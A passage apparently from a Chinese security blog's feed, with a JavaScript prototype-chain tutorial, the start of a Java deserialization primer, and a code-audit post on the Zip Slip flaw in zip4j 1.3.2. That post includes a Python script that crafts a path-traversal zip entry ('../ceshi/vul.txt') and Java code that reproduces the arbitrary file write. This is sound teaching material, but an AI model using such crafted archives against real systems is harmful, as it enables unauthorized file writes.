class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后的实际效果如下</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221123223023569.png"></p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221123223047948.png"></p><h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><pre><code>https://portswigger.net/burp/extender/api/https://github.com/bit4woo/burp-api-drops</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript的原型链理解</title>
      <link href="/2022/11/01/javascript-de-yuan-xing-lian-li-jie/"/>
      <url>/2022/11/01/javascript-de-yuan-xing-lian-li-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一岁有一岁的味道，一站有一站的风景，何不停下繁忙的脚步看看沿途盛开的花。</p><h2 id="0x01-原型"><a href="#0x01-原型" class="headerlink" title="0x01 原型"></a>0x01 原型</h2><p>在理解原型链之前，我们先来了解下什么是原型？</p><p>在javascript中，一切皆为对象，我们一般将对象分为函数对象和普通对象，当我们试图访问对象的属性时，如果在对象上找不到属性，就会在该对象的原型上寻找，如果在对象的原型上找不到，就会在该对象的原型的原型上搜寻，这样依次层层搜寻，直到找到属名字匹配的属性或者到达到原型链的末尾。</p><p>举个例子，函数中可以有属性，每个属性都有一个特殊的属性叫做原型prototype</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打印结果</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>    constructor<span class="token operator">:</span> ƒ a(<span class="token punctuation">)</span><span class="token punctuation">,</span>    &lt;prototype><span class="token operator">:</span> <span class="token punctuation">{</span>        constructor<span class="token operator">:</span> ƒ Object(<span class="token punctuation">)</span><span class="token punctuation">,</span>        hasOwnProperty<span class="token operator">:</span> ƒ hasOwnProperty(<span class="token punctuation">)</span><span class="token punctuation">,</span>        isPrototypeOf<span class="token operator">:</span> ƒ isPrototypeOf(<span class="token punctuation">)</span><span class="token punctuation">,</span>        propertyIsEnumerable<span class="token operator">:</span> ƒ propertyIsEnumerable(<span class="token punctuation">)</span><span class="token punctuation">,</span>        toLocaleString<span class="token operator">:</span> ƒ toLocaleString(<span class="token punctuation">)</span><span class="token punctuation">,</span>        toString<span class="token operator">:</span> ƒ toString(<span class="token punctuation">)</span><span class="token punctuation">,</span>        valueOf<span class="token operator">:</span> ƒ valueOf(<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到原型对象有个自有属性constructor，这个属性指向构造函数本身,即<code>a.prototype.constructor = a</code>。</p><h2 id="0x02-原型链"><a href="#0x02-原型链" class="headerlink" title="0x02 原型链"></a>0x02 原型链</h2><p>前面我们说了javascript把对象分为函数对象和普通对象，每个对象都有__proto__属性，但是只有函数对象才有原型prototype属性。那么什么是__proto__和prototype呢？</p><ul><li>属性__proto__是一个对象，他有两个属性：constructor和__proto__;</li><li>原型对象prototype有一个默认的constructor属性，用于记录实例是由哪个构造函数创建；</li></ul><p>我们通过一段代码来理解什么是原型链。</p><pre class="line-numbers language-java"><code class="language-java">function <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"mike"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>var person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>city <span class="token operator">=</span> <span class="token string">"GZ"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>city<span class="token punctuation">)</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>eat<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析下上面的代码</p><p>1、构造函数存在原型对象Person.prototype;</p><p>2、构造函数生成实例对象person，person的__proto__指向Person原型对象，即<code>person.__proto__==Person.prototype</code>;</p><p>3、在Person函数上定义一个属性city;</p><p>4、city不是person的自有属性，但是在它的原型上(person.[[Prototype]])存在该属性，因此打印出值为GZ；</p><p>5、eat不是person的自有属性，于是在person的原型对象上找，同样不是person的原型对象的属性，继续在person的原型对象的原型上搜寻，person.[[Prototype]].[[Prototype]]为null，停止搜索，因此person.eat的值为undefined。</p><h2 id="0x03-原型链的意义"><a href="#0x03-原型链的意义" class="headerlink" title="0x03 原型链的意义"></a>0x03 原型链的意义</h2><p>我们设想一个场景，我们都是学生，我们都有名字，年纪，性别，我们大都来自同一个学校，这个时候我们可以这样操作</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Student</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>sex<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span><span class="token punctuation">}</span>Student<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>SchoolName <span class="token operator">=</span> <span class="token string">"No.1 school"</span><span class="token punctuation">;</span><span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">"mike"</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">"boy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时我们打印a1，我们可以发现它有了SchoolName属性，那如果有个学校来自别的学校呢？</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Student</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>sex<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span><span class="token punctuation">}</span>Student<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>SchoolName <span class="token operator">=</span> <span class="token string">"No.1 school"</span><span class="token punctuation">;</span><span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">"mike"</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">"boy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> b1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">"john"</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">"boy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> c1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">"lina"</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">"girl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c1<span class="token punctuation">.</span>SchoolName <span class="token operator">=</span> <span class="token string">"No.2 school"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打印结果如下：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221102155149565.png"></p><p>可以看到c1.c1.SchoolName的值为”No.2 school”，而前两个的值还是”No.1 school”，通过这种方式，实例对象重写原型上继承的属性、方法，这就是我们所说的”属性屏蔽”，这一操作不会影响原有的属性和方法。</p><h2 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h2><p><a href="https://juejin.cn/post/6844903989088092174#heading-0">轻松理解JS 原型原型链</a></p><p><a href="https://vue3js.cn/interview/JavaScript/prototype.html#%E4%BA%8C%E3%80%81%E5%8E%9F%E5%9E%8B%E9%93%BE">面试官：JavaScript原型，原型链 ? 有什么特点？</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF">继承与原型链</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计之Zip Slip</title>
      <link href="/2022/10/29/java-dai-ma-shen-ji-zhi-zip-slip/"/>
      <url>/2022/10/29/java-dai-ma-shen-ji-zhi-zip-slip/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>自由，在这个从头烂到根的地方早已不存在了。</p><h2 id="0x01-Zip-Slip？"><a href="#0x01-Zip-Slip？" class="headerlink" title="0x01 Zip Slip？"></a>0x01 Zip Slip？</h2><p>Zip Slip这个漏洞是在18年由国外安全团队snyk提出的，这个漏洞允许攻击者在系统中任意写入一个文件来达到RCE的目的，简单来说，Zip Slip其实算是目录遍历的一种漏洞，攻击者可以构造一个压缩文件名为”../../test”的压缩包，在解压时，程序没有对文件名进行合法的校验，而是直接拼接到解压目录后面，导致可以将文件解压到正常解压目录之外。</p><p>目前很多开发语言，比如Python、javascript等都相应考虑到并修复了该漏洞，但是由于java没有对存档文件进行处理的高级API，所以这个漏洞在java环境最为常见。</p><p>snyk建立了一个项目，我们可以对应自己的项目看看是否存在版本漏洞</p><p><a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>这里以zip4j1.3.2为例子</p><p>由于在windows中不允许文件名有”../“这种字符，所以我们使用脚本构造一个恶意的poc.zip</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> os<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        zipFile <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"poc.zip"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span>        info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"poc.zip"</span><span class="token punctuation">)</span>        zipFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"E:/vul.txt"</span><span class="token punctuation">,</span><span class="token string">"../ceshi/vul.txt"</span><span class="token punctuation">,</span>zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span>        zipFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>导入依赖：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>net.lingala.zip4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>zip4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解压poc.zip</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> net<span class="token punctuation">.</span>lingala<span class="token punctuation">.</span>zip4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>ZipFile<span class="token punctuation">;</span><span class="token keyword">import</span> net<span class="token punctuation">.</span>lingala<span class="token punctuation">.</span>zip4j<span class="token punctuation">.</span>exception<span class="token punctuation">.</span>ZipException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            ZipFile zipFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipFile</span><span class="token punctuation">(</span><span class="token string">"E:\\tool\\demo\\poc.zip"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            zipFile<span class="token punctuation">.</span><span class="token function">extractAll</span><span class="token punctuation">(</span><span class="token string">"E:\\tool\\"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ZipException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们生成一个恶意的压缩包为poc.zip，里面的压缩条目名为”../ceshi/vul.txt”，我们的解压目录为<code>E:\\tool\\</code>，正常来说，我们的压缩包解压后会解压在<code>E:\\tool\\</code>下，但是由于程序没有对文件名做好校验，导致我们最终解压的文件会在<code>E:\ceshi</code>下，复现结果也是成功跳出了正常的解压目录达到任意写文件的目的。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029232425544.png"></p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>我们先在第12行下个断点，看看zip4j是怎么处理解压的。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029232634259.png"></p><p>调试步入extractAll方法</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029232916616.png"></p><p>跟进到extractAll重载方法</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029232950233.png"></p><p>这里重点关注第241行，跟进去看看</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029233404916.png"></p><p>这里的runThread为false，所以我们继续跟进到51行的this.initExtractAll</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029233550516.png"></p><p>继续跟进到62行的重载</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">initExtractFile</span><span class="token punctuation">(</span>FileHeader fileHeader<span class="token punctuation">,</span> String outPath<span class="token punctuation">,</span> UnzipParameters unzipParameters<span class="token punctuation">,</span> String newFileName<span class="token punctuation">,</span> ProgressMonitor progressMonitor<span class="token punctuation">)</span> <span class="token keyword">throws</span> ZipException <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fileHeader <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ZipException</span><span class="token punctuation">(</span><span class="token string">"fileHeader is null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            progressMonitor<span class="token punctuation">.</span><span class="token function">setFileName</span><span class="token punctuation">(</span>fileHeader<span class="token punctuation">.</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>outPath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span>InternalZipConstants<span class="token punctuation">.</span>FILE_SEPARATOR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                outPath <span class="token operator">=</span> outPath <span class="token operator">+</span> InternalZipConstants<span class="token punctuation">.</span>FILE_SEPARATOR<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fileHeader<span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    String fileName <span class="token operator">=</span> fileHeader<span class="token punctuation">.</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Zip4jUtil<span class="token punctuation">.</span><span class="token function">isStringNotNullAndNotEmpty</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">return</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    String completePath <span class="token operator">=</span> outPath <span class="token operator">+</span> fileName<span class="token punctuation">;</span>                    File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>completePath<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        file<span class="token punctuation">.</span><span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    progressMonitor<span class="token punctuation">.</span><span class="token function">endProgressMonitorError</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ZipException</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkOutputDirectoryStructure</span><span class="token punctuation">(</span>fileHeader<span class="token punctuation">,</span> outPath<span class="token punctuation">,</span> newFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                UnzipEngine unzipEngine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnzipEngine</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>zipModel<span class="token punctuation">,</span> fileHeader<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    unzipEngine<span class="token punctuation">.</span><span class="token function">unzipFile</span><span class="token punctuation">(</span>progressMonitor<span class="token punctuation">,</span> outPath<span class="token punctuation">,</span> newFileName<span class="token punctuation">,</span> unzipParameters<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    progressMonitor<span class="token punctuation">.</span><span class="token function">endProgressMonitorError</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ZipException</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ZipException</span> var11<span class="token punctuation">)</span> <span class="token punctuation">{</span>            progressMonitor<span class="token punctuation">.</span><span class="token function">endProgressMonitorError</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> var11<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var12<span class="token punctuation">)</span> <span class="token punctuation">{</span>            progressMonitor<span class="token punctuation">.</span><span class="token function">endProgressMonitorError</span><span class="token punctuation">(</span>var12<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ZipException</span><span class="token punctuation">(</span>var12<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当文件不是目录时，则进入checkOutputDirectoryStructure方法来处理文件，跟进到checkOutputDirectoryStructure</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221029235402198.png"></p><p>漏洞点存在于第162到165行，在第165行没有经过任何过滤直接将解压目录和文件进行拼接，导致我们可以构造一个<code>../test</code>的文件名压缩后，再解压就能达到任意写入恶意文件的目的。</p><p>0x04 参考资料</p><p><a href="https://xz.aliyun.com/t/2382">Zip Slip漏洞综述</a></p><p><a href="https://blog.ryotak.me/post/homebrew-security-incident-en/">Remote code execution in Homebrew by compromising the official Cask repository</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化之基础篇</title>
      <link href="/2022/10/25/java-fan-xu-lie-hua-zhi-ji-chu-pian/"/>
      <url>/2022/10/25/java-fan-xu-lie-hua-zhi-ji-chu-pian/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>梦想注定是孤独的旅行，路上少不了嘲笑和质疑。</p><h2 id="0x01-反序列化和序列化？"><a href="#0x01-反序列化和序列化？" class="headerlink" title="0x01 反序列化和序列化？"></a>0x01 反序列化和序列化？</h2><p>通俗点来讲，序列化是指把java对象保存为字节序列的过程，而把字节序列转为java对象的过程称为反序列化。</p><pre><code>字节序列 -&gt; 对象   序列化对象 -&gt; 字节序列     反序列化</code></pre><p>什么情况下需要序列化呢？</p><ul><li>永久性保存对象，保存对的字节序列到本地文件或者数据库中；</li><li>通过序列化以字节流的形式对象在网络中进行传递和接收；</li><li>通过序列化在进程间传递对象。</li></ul><h2 id="0x02-实现过程"><a href="#0x02-实现过程" class="headerlink" title="0x02 实现过程"></a>0x02 实现过程</h2><p>在编写实例代码之前，我们先来了解下两个重要的方法writeObject()和readObject()，ObjectOutputStream类的writeObject()方法可以对参数指定的obj对象进行序列化操作，并将得到的字节序列写道目标输出流中，相反的，readObject()方法则是从院输入流中读取字节序列，再将其反序列化为java对象。</p><p>代码如下</p><p>抽象类：Student.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//无参构造</span>    <span class="token keyword">public</span> <span class="token function">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//有参构造</span>    <span class="token keyword">public</span> <span class="token function">Student</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> String name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span 